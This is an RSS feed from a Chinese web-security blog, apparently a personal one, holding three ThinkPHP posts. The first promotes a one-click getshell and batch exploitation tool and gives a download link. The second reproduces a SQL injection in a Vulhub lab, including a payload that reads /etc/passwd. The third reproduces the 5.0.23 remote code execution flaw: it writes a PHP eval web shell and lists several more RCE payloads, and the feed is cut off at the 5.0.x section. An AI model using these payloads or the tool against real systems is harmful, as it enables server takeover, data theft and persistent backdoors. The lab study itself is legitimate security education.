<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Web攻防 on SlimerのBlog</title><link>http://localhost:1313/categories/web%E6%94%BB%E9%98%B2/</link><description>Recent content in Web攻防 on SlimerのBlog</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><copyright>Slimer</copyright><lastBuildDate>Thu, 04 Sep 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/web%E6%94%BB%E9%98%B2/index.xml" rel="self" type="application/rss+xml"/><item><title>【Thinkphp】漏洞利用工具-thinkphp_gui_tools</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7-thinkphp_gui_tools/</guid><description>&lt;img src="http://localhost:1313/images/33.webp" alt="Featured image of post 【Thinkphp】漏洞利用工具-thinkphp_gui_tools" />&lt;h1 id="介绍">介绍&lt;/h1>
&lt;p>ThinkPHP漏洞综合利用工具, 图形化界面, 命令执行, 一键getshell, 批量检测, 日志遍历, session包含,宝塔绕过。&lt;/p>
&lt;h1 id="下载地址">下载地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">通过网盘分享的文件：ThinkPHP.jar
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">链接: https://pan.baidu.com/s/1eoU2Lf-ldHhy9W2jx8sRpA 提取码: bn8b
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">--来自百度网盘超级会员v4的分享
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="项目地址">项目地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">github&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bewhale&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkphp_gui_tools&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>本项目是采用 JDK8 + javafx 开发的 ThinkPHP 图形化综合利用工具， 参考了其他大佬项目的部分代码。 JDK8可以直接运行，JDK11 因为去除了javafx这个依赖，需要自己再加上参数加入模块&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">java -Dfile.encoding=&amp;#34;UTF-8&amp;#34; --module-path &amp;#34;C:\Program Files\Java\javafx-sdk-11.0.2\lib&amp;#34; --add-modules &amp;#34;javafx.controls,javafx.fxml,javafx.web&amp;#34; -jar &amp;#34;xxx.jar&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持大部分&lt;/span>&lt;span class="n">ThinkPHP漏洞检测&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="err">整合&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="err">多个&lt;/span>&lt;span class="n">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持部分漏洞执行命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持单一漏洞批量检测&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持&lt;/span>&lt;span class="n">TP3和TP5自定义路径日志遍历&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持部分漏洞一键&lt;/span>&lt;span class="n">GetShell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">支持设置代理和&lt;/span>&lt;span class="n">UA&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904105315.png" alt="image.png">&lt;/p></description></item><item><title>【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5-sql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</guid><description>&lt;img src="http://localhost:1313/images/32.webp" alt="Featured image of post 【Thinkphp漏洞复现】ThinkPHP5 SQL注入与敏感信息泄露" />&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">进入&lt;/span>&lt;span class="n">Vulhub&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">cd&lt;/span> &lt;span class="n">vulhub&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">master&lt;/span>\&lt;span class="n">thinkphp&lt;/span>\&lt;span class="ow">in&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">sqlinjection&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">docker&lt;/span> &lt;span class="n">compose&lt;/span> &lt;span class="n">up&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="c1"># 启动后为空白页面，需通过Payload触发漏洞&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>搭建好后是空白页面&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104644.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞利用">漏洞利用&lt;/h1>
&lt;h2 id="报错注入-payload">报错注入 Payload：&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://your-ip:8080/index.php?ids[0,updatexml(0,concat(0xa,user(),0xa),0)]=1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;ul>
&lt;li>执行后会显示数据库用户信息（如&lt;code>root@localhost&lt;/code>）。&lt;/li>
&lt;/ul>
&lt;h2 id="信息泄露利用">信息泄露利用：&lt;/h2>
&lt;ul>
&lt;li>获取数据库版本：&lt;code>ids[0,updatexml(0,concat(0xa,version()),0)]=1&lt;/code>&lt;/li>
&lt;li>读取文件：&lt;code>ids[0,load_file('/etc/passwd')]=1&lt;/code>（需数据库权限）&lt;br>
利用报错来查看版本信息&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104802.png" alt="image.png">&lt;br>
利用工具进行测试：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904104819.png" alt="image.png">&lt;/li>
&lt;/ul>
&lt;h1 id="其他">其他&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="err">存在&lt;/span>&lt;span class="n">ThinkPHP&lt;/span> &lt;span class="mi">5&lt;/span> &lt;span class="n">SQL注入漏洞&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="err">敏感信息泄露&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Payload&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">http&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">//&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">ids&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">updatexml&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0xa&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="p">()),&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">[&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="err">存在&lt;/span>&lt;span class="n">ThinkPHP&lt;/span> &lt;span class="mf">5.&lt;/span>&lt;span class="n">x&lt;/span> &lt;span class="err">数据库信息泄露&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Payload&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">username&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="n">hostname&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">mysql&lt;/span> &lt;span class="n">password&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">root&lt;/span> &lt;span class="n">database&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="n">cat&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div></description></item><item><title>【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞</title><link>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</link><pubDate>Thu, 04 Sep 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/thinkphp%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0thinkphp5.0.23%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</guid><description>&lt;img src="http://localhost:1313/images/31.webp" alt="Featured image of post 【Thinkphp漏洞复现】Thinkphp5.0.23远程代码执行漏洞" />&lt;h1 id="漏洞形成原因">漏洞形成原因&lt;/h1>
&lt;h2 id="框架介绍">框架介绍：&lt;/h2>
&lt;p>ThinkPHP是一款运用极广的PHP开发框架。&lt;/p>
&lt;h2 id="漏洞引入">漏洞引入：&lt;/h2>
&lt;p>其5.0.23以前的版本中，获取&lt;strong>method&lt;/strong>的方法中没有正确处理方法名，导致攻击者可以调用&lt;strong>Request&lt;/strong>类任意方法并构造利用链，从而导致远程代码执行漏洞。&lt;/p>
&lt;h1 id="漏洞如何利用">漏洞如何利用&lt;/h1>
&lt;p>访问靶机地址+端口号 进入首页&lt;br>
Burp抓包修改传参方式为Post，传入参数为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="s2">&amp;#34;_method=__construct&amp;amp;filter[]=system&amp;amp;method=get&amp;amp;server[REQUEST_METHOD]=pwd&amp;#34;&lt;/span>&lt;span class="err">，其中&lt;/span>&lt;span class="n">pwd为系统执行命令可进行一系列操作&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="环境搭建">环境搭建&lt;/h1>
&lt;p>使用&lt;strong>vulhub&lt;/strong>靶场进行搭建&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">cd thinkphp/5.0.23-rce/
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker-compose up -d
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">docker ps
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094154.png" alt="image.png">&lt;br>
访问链接：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094245.png" alt="image.png">&lt;/p>
&lt;h1 id="漏洞复现">漏洞复现&lt;/h1>
&lt;p>burp抓包&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094438.png" alt="image.png">&lt;br>
修改&lt;br>
传参方式为Post，url后接入&lt;code>/index.php?s=captch&lt;/code>，传入参数为&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">pwd&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904094649.png" alt="image.png">&lt;br>
&lt;strong>尝试写入phpinfo&lt;/strong>&lt;br>
参数改成&lt;code>echo &amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot; &amp;gt; info.php&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s2">&amp;#34;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;#34;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">info&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095528.png" alt="image.png">&lt;br>
&lt;strong>写入一句话&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">_method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">__construct&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">filter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">method&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">server&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">REQUEST_METHOD&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">echo&lt;/span> &lt;span class="s1">&amp;#39;&amp;lt;?php eval($_POST[aaa]); ?&amp;gt;&amp;#39;&lt;/span> &lt;span class="o">&amp;gt;&lt;/span> &lt;span class="n">shell&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095644.png" alt="image.png">&lt;br>
&lt;strong>上蚂剑&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">http://192.168.197.140:8080/shell.php
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">密码：aaa
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250904095726.png" alt="image.png">&lt;br>
&lt;strong>成功&lt;/strong>&lt;br>
&lt;strong>做完实验后关闭环境 docker-compose down&lt;/strong>&lt;/p>
&lt;h1 id="更多版本">更多版本&lt;/h1>
&lt;p>漏洞触发点和版本的不同，所以payload也不⼀样,条件也不⼀样&lt;br>
5.0.13~5.0.19默认情况下config中的app_debug配置项为false。&lt;br>
复现的时候需要开启这个&lt;br>
&lt;strong>总结⼀下 5.1.x ：&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkRequest&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">input&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">fiLter&lt;/span>&lt;span class="p">[]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">data&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">pwd&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkviewdriverPhp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">dispLay&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="n">php&lt;/span> &lt;span class="n">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinktempLatedriverfiLe&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">cacheFiLe&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">sheLL&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">content&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="err">?&lt;/span> &lt;span class="n">php&lt;/span> &lt;span class="n">phpinfo&lt;/span>&lt;span class="p">();&lt;/span>&lt;span class="err">?&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkContainer&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="k">var&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">system&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">?&lt;/span>&lt;span class="n">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">thinkapp&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">invokefunction&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">function&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">caLL_user_func_array&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">s&lt;/span> &lt;span class="n">ystem&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">vars&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="p">][]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">id&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>5.0.x ：&lt;/strong>&lt;/p>
